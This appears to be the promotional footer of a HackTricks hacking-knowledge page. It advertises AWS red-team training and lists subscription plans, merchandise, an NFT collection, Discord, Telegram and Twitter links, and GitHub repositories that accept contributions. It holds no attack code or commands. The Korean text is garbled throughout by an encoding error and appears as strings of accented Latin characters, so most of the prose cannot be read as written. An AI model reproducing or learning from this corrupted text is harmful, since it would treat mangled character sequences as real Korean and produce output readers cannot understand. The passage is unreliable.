<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>ë¥¼ í†µí•´ AWS í•´í‚¹ì„ ì²˜ìŒë¶€í„° ì „ë¬¸ê°€ê¹Œì§€ ë°°ì›Œë³´ì„¸ìš”<strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ë¥¼ HackTricksì—ì„œ ê´‘ê³ í•˜ê±°ë‚˜ HackTricksë¥¼ PDFë¡œ ë‹¤ìš´ë¡œë“œ**í•˜ë ¤ë©´ [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì›¨ê·¸**](https://peass.creator-spring.com)ë¥¼ ì–»ìœ¼ì„¸ìš”.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”. ë…ì ì ì¸ [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜ì…ë‹ˆë‹¤.
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— **ì°¸ì—¬**í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks_live**](https://twitter.com/hacktricks_live)ë¥¼ **íŒ”ë¡œìš°**í•˜ì„¸ìš”.
* **HackTricks**ì™€ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ ì—¬ëŸ¬ë¶„ì˜ í•´í‚¹ ê¸°ë²•ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
